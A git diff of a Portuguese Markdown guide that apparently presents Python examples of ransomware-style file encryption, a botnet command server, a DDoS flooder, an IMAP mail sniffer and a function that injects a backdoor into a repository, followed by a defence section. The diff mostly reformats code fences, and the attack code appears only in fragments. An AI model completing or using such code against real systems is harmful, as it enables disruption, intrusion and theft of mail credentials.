@@ -124,8 +124,12 @@ encrypt_file('arquivo_importante.txt')
 ```
  
 * **Botnet:**
-  * **socket:** Criar servidor central.
-  ```
+  * **socket:** Criar servidor central.  
+# Exemplo de uso
+create_botnet_server('127.0.0.1', 12345)
+
+
+```
 import socket
 
 def create_botnet_server(host, port):
@@ -145,13 +149,10 @@ def create_botnet_server(host, port):
         conn.close()
 ```
 
-# Exemplo de uso
-create_botnet_server('127.0.0.1', 12345)
-
 * **DDoS:**
   * **socket:** Enviar múltiplas requisições.
 
-   ```
+```
 import socket
 import threading
 
@@ -171,13 +172,13 @@ if __name__ == '__main__':
         t.start()
         threads.append(t)
 
-   ```
+```
 
    
 * **Mail Sniffer:**
   * **imaplib:** Interagir com servidores IMAP.
 
- ```
+```
 import imaplib
 
 def check_mailbox(host, username, password):
@@ -220,6 +221,7 @@ inject_malware("/path/to/your/repo", "backdoor.py")
 
 ```
 
+--- 
 
 ## Defesa contra Ataques
 * **Análise de malware:**
